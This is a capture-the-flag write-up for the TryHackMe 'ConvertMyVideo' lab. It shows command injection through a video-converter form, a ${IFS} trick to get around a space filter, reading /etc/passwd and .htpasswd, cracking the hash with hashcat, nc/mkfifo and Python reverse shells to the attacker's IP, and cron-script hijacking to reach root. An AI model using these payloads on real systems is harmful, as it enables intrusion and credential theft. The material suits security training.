# TryHackMe: ConvertMyVideo

## Info

- Apache/2.4.29 


## Nmap

Two services; 22 SSH, 80 HTTP.


```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo$ nmap -A 10.10.44.51
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 18:43 BST
Nmap scan report for 10.10.44.51
Host is up (0.022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

Found a few directories.
Nothing that we can read from.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo$ gobuster dir -u http://10.10.154.154 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.154.154
[+] Threads:        100
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/03 23:51:49 Starting gobuster
===============================================================
/images (Status: 301)
/admin (Status: 401)
/js (Status: 301)
/tmp (Status: 301)
Progress: 14761 / 220561 (6.69%)
```

Found /admin portal.
Uses basic authentication.
Can brute force with hydra http-get.

## Toying with Requests

Captured requests with Burp.
Edited request body.
Different status codes returned for different errorneous URLs.

- `yt_url='`
	```
	{"status":2,"errors":"sh: 1: Syntax error: \"(\" unexpected\n","url_orginal":"'","output":"","result_url":"\/tmp\/downloads\/5f78fee699143.mp3"}
	```
- `yt_url=http://localhost`
	```
	{"status":1,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nWARNING: Falling back on generic information extractor.\nERROR: Unsupported URL: http:\/\/localhost\n","url_orginal":"http:\/\/localhost","output":"[generic] localhost: Requesting header\n[generic] localhost: Downloading webpage\n[generic] localhost: Extracting information\n","result_url":"\/tmp\/downloads\/5f78ff1ed34ad.mp3"}
	```

URLs are requested then outputted to `/tmp/downloads/somehash.mp3`.

There was reference to `/tmp/downloads/###.mp3` in the previous errors, but these are inaccessible.

Navigating to `http://##/tmp` returns a 401 (Forbidden) error.
`/tmp/downloads` returns `Not Found`. Which, means it doesn't exit.

Status error `2` makes reference to `sh` errors.
I'm assuming there's something running through bash.

I searched for the errors in Google.
Found [YOUTUBEDL.py on Github](https://gist.github.com/averageflow/88a8aa5f7fbbe7eb4ccb486db4c79c23)

I ran a test on whether the server makes requests to a locally hosted python server. 
I can confirm it does.
However, I can't access the outputted files.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo/python$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.154.154 - - [04/Oct/2020 00:12:58] "HEAD /exploit.php HTTP/1.1" 200 -
10.10.154.154 - - [04/Oct/2020 00:12:58] "GET /exploit.php HTTP/1.1" 200 -
```

I tried 3 potential exploit scripts, incase they were opened and ran. 
I attempted PHP, Python and Shell scripts.

But, though they were downloaded, this was seemingly to no avail.
Perhaps we should focus more on command injection payloads.
After all, the error hints towards `sh`.

I tried to submit a null byte, `%00`.
Got a slightly different output.

```shell
{"status":2,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\n","url_orginal":"\u0000","output":"","result_url":"\/tmp\/downloads\/5f7909beb8dab.mp3"}
```

This output mentions 'youtube-dl'. 
And it looks like bash output.
Perhaps we can fire another script.

I tried `ls;` as the payload.
Pops a different error code, `127`.

```shell
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u'id' is not a valid URL. Set --default-search \"ytsearch\" (or run  youtube-dl \"ytsearch:ls\" ) to search YouTube\nsh: 1: -f: not found\n","url_orginal":"ls;","output":"","result_url":"\/tmp\/downloads\/5f790ad53c01a.mp3"}
```

The error shows that `ls` is surrounded with `''`s, after some potential `u` flag.

I tried another payload `;ls` in an attempt to escape commands.
Got an interesting output.

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";ls;","output":"admin\nimages\nindex.php\njs\nstyle.css\ntmp\n","result_url":"\/tmp\/downloads\/5f790c726205e.mp3"}
```

We got RCE with the following request.

```shell
POST / HTTP/1.1
Host: 10.10.154.154
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.154.154/
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 11
Connection: close

yt_url=;ls;
```

## Exploiting RCE

We can chain a few requests.
But we don't get output when including spaces.

```
yt_url=;ls;id;whoami;


"url_orginal":";ls;id;whoami;",
"output":"admin\nimages\nindex.php\njs\nstyle.css\ntmp\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwww-data\n"
```

We need a way to bypass spaces.
I found a [Stack Overflow post that notes that we can use `${IFS}`](https://unix.stackexchange.com/a/351509) in place of spaces.

```shell
## Payload
;cat${IFS}/etc/passwd;
```

And we get the response..

```json
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cat${IFS}\/etc\/passwd;","output":"root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\nbackup:x:34:34:backup:\/var\/backups:\/usr\/sbin\/nologin\nlist:x:38:38:Mailing List Manager:\/var\/list:\/usr\/sbin\/nologin\nirc:x:39:39:ircd:\/var\/run\/ircd:\/usr\/sbin\/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):\/var\/lib\/gnats:\/usr\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/nonexistent:\/usr\/sbin\/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:\/run\/systemd\/netif:\/usr\/sbin\/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:\/run\/systemd\/resolve:\/usr\/sbin\/nologin\nsyslog:x:102:106::\/home\/syslog:\/usr\/sbin\/nologin\nmessagebus:x:103:107::\/nonexistent:\/usr\/sbin\/nologin\n_apt:x:104:65534::\/nonexistent:\/usr\/sbin\/nologin\nlxd:x:105:65534::\/var\/lib\/lxd\/:\/bin\/false\nuuidd:x:106:110::\/run\/uuidd:\/usr\/sbin\/nologin\ndnsmasq:x:107:65534:dnsmasq,,,:\/var\/lib\/misc:\/usr\/sbin\/nologin\nlandscape:x:108:112::\/var\/lib\/landscape:\/usr\/sbin\/nologin\npollinate:x:109:1::\/var\/cache\/pollinate:\/bin\/false\nsshd:x:110:65534::\/run\/sshd:\/usr\/sbin\/nologin\ndmv:x:1000:1000:dmv:\/home\/dmv:\/bin\/bash\n","result_url":"\/tmp\/downloads\/5f79120e994f7.mp3"}
```

We can see the user `dmv`.

With our new knowledge of bypassing spaces, lets get reverse shell.

```shell
## reverse shell payload
;nc${IFS}10.11.8.219${IFS}4444${IFS}-e${IFS}/bin/sh;
```

This fails. But we can try a mkfifo reverse shell instead.

```shell
;rm${IFS}/tmp/f;mkfifo${IFS}/tmp/f;cat${IFS}/tmp/f|/bin/sh${IFS}-i${IFS}2>&1|nc${IFS}10.11.8.219${IFS}4444${IFS}>/tmp/f;
```

We get a connection, but can't maintain persistence.

```shell
kali@kali:~/Desktop/repos/ctf/try-hack-me$ nc -lvp 4444
listening on [any] 4444 ...
10.10.154.154: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.154.154] 47656
whoami
```

The earlier nmap scan shows the SSH is open on 22.
We've already enumerated `dmv` as a user, perhaps we can get SSH keys.

```shell
## payload
;ls${IFS}-lah${IFS}/home/dmv;

## output
total 36K\ndrwxr-xr-x 4 dmv  dmv  4.0K Apr 12 05:16 .\ndrwxr-xr-x 3 root root 4.0K Apr 12 01:05 ..\n-rw------- 1 dmv  dmv   996 Apr 12 05:16 .bash_history\n-rw-r--r-- 1 dmv  dmv   220 Apr  4  2018 .bash_logout\n-rw-r--r-- 1 dmv  dmv  3.7K Apr  4  2018 .bashrc\ndrwx------ 3 dmv  dmv  4.0K Apr 12 02:43 .cache\ndrwx------ 3 dmv  dmv  4.0K Apr 12 01:05 .gnupg\n-rw-r--r-- 1 dmv  dmv   807 Apr  4  2018 .profile\n-rw-r--r-- 1 dmv  dmv     0 Apr 12 01:07 .sudo_as_admin_successful\n-rw------- 1 root root  976 Apr 12 02:56 .viminfo\n

## cleanup
total 36K
drwxr-xr-x 4 dmv  dmv  4.0K Apr 12 05:16 .
drwxr-xr-x 3 root root 4.0K Apr 12 01:05 ..
-rw------- 1 dmv  dmv   996 Apr 12 05:16 .bash_history
-rw-r--r-- 1 dmv  dmv   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 dmv  dmv  3.7K Apr  4  2018 .bashrc
drwx------ 3 dmv  dmv  4.0K Apr 12 02:43 .cache
drwx------ 3 dmv  dmv  4.0K Apr 12 01:05 .gnupg
-rw-r--r-- 1 dmv  dmv   807 Apr  4  2018 .profile
-rw-r--r-- 1 dmv  dmv     0 Apr 12 01:07 .sudo_as_admin_successful
-rw------- 1 root root  976 Apr 12 02:56 .viminfo
```

No SSH keys. 
Though, the user might allow us to privesc to root later.
Note `.sudo_as_admin_successful`.

Perhaps we can find the password for the `/admin` web directory instead.

```shell
## payload
;cd${IFS}admin;ls${IFS}-lah;

## output
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cd${IFS}admin;ls${IFS}-lah;","output":"total 24K\ndrwxr-xr-x 2 www-data www-data 4.0K Apr 12 05:05 .\ndrwxr-xr-x 6 www-data www-data 4.0K Apr 12 04:42 ..\n-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess\n-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd\n-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt\n-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php\n","result_url":"\/tmp\/downloads\/5f7917b26178d.mp3"}

## cleanup
total 24K
drwxr-xr-x 2 www-data www-data 4.0K Apr 12 05:05 .
drwxr-xr-x 6 www-data www-data 4.0K Apr 12 04:42 ..
-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess
-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd
-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt
-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php
```

Looks like we've found a flag!
Lets get it, then check out the `.htpasswd` and `index.php` files.
The `.htpasswd` file will contain users and passwords.

```shell
## payload
;cd${IFS}admin;cat${IFS}flag.txt;cat${IFS}.htpasswd;cat${IFS}index.php;

## output
{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";cd${IFS}admin;cat${IFS}flag.txt;cat${IFS}.htpasswd;cat${IFS}index.php;","output":"flag{0d8486a0c0c42503bb60ac77f4046ed7}\nitsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/\n<?php\r\n  if (isset($_REQUEST['c'])) {\r\n      system($_REQUEST['c']);\r\n      echo \"Done :)\";\r\n  }\r\n?>\r\n\r\n<a href=\"\/admin\/?c=rm -rf \/var\/www\/html\/tmp\/downloads\">\r\n   <button>Clean Downloads<\/button>\r\n<\/a>","result_url":"\/tmp\/downloads\/5f7918d2dec1c.mp3"}

## cleanup

flag{0d8486a0c0c42503bb60ac77f4046ed7}
itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y\/
<?php\r
  if (isset($_REQUEST['c'])) {\r
      system($_REQUEST['c']);\r
      echo \"Done :)\";\r
  }\r
  ?>\r
\r
<a href=\"\/admin\/?c=rm -rf \/var\/www\/html\/tmp\/downloads\">\r
   <button>Clean Downloads<\/button>\r
<\/a>
```

Interestingly, the admin panel seems to accept shell scripts.
Lets crack the password and try login.


```shell

kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo$ hashcat -a 0 -m 1600 creds3.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz, 13903/13967 MB (4096 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/:jessie

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
Time.Started.....: Sun Oct  4 01:46:27 2020 (2 secs)
Time.Estimated...: Sun Oct  4 01:46:29 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      529 H/s (10.45ms) @ Accel:256 Loops:125 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidates.#1....: 123456 -> bethany

Started: Sun Oct  4 01:45:34 2020
Stopped: Sun Oct  4 01:46:30 2020
kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo$

```

We get the password as `jessie`.
And login.
In the admin panel, there's a button that runs bash code.
With spaces!

```php

<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
   <button>Clean Downloads</button>
</a>

```

Means we no longer needs to mess around with the messy payloads at least.

At this point, switch into Firefox.
I'm not super fond of Burp.
We can just run commands in firefox directly.
I prefix `view-source` for nicer formatting.

```shell
view-source:http://10.10.154.154/admin/?c=rm%20-rf%20/var/www/html/tmp/downloads
```

After so trial and error, eventually get reverse shell.
The system has python.

```
## payload
view-source:http://10.10.154.154/admin/?c=
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.11.8.219",4444));os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'

## netcat listener
kali@kali:~/Desktop/repos/ctf/try-hack-me/convertmyvideo$ nc -lvp 4444
listening on [any] 4444 ...
10.10.154.154: inverse host lookup failed: Unknown host
connect to [10.11.8.219] from (UNKNOWN) [10.10.154.154] 47658
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Then, we can upgrade terminal.

```shell

$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dmv:/$

```

The process list shows that root's cronjob is running clean.sh.

We can write to clean.sh, which, can get the root flag for us.

```shell

$ echo 'cat /root/root.txt > root.txt' >> /var/www/html/tmp/clean.sh
$ cd /var/www/html/tmp
$ ls
clean.sh
root.txt
$ cat root.txt
flag{d9b368018e912b541a4eb68399c5e94a}

```



